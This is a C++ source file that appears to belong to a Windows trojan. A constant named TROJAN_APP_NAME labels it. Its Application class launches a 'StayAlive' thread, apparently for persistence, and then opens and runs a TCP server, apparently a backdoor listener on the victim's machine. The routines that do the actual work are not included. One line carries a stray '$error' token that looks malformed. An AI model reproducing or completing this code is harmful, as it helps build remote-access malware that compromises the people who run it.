#include "Application.hpp"
#include "Server.h"
#include "..\Tools.h"
#include "..\Debugger.h"
#include "..\Constants.h"

BOOL Application::startSavingThread()
{
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
	{
		PrintError(TEXT("CreateThread"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

Application::Application() :
	m_tcpServer_sock(INVALID_SOCKET)
{
}

Application::~Application()
{
	closesocket(m_tcpServer_sock);
	WSACleanup();
}

BOOL Application::init()
{
	if(!startSavingThread())
		return FALSE;

	m_tcpServer_sock = InitTCPServer();
	if (m_tcpServer_sock == INVALID_SOCKET)
	{
		$error _tprintf(TEXT("Cannot initialize the server\n"));

		return FALSE;
	}

	return TRUE;
}

VOID Application::run()
{
	RunServer(m_tcpServer_sock);
}
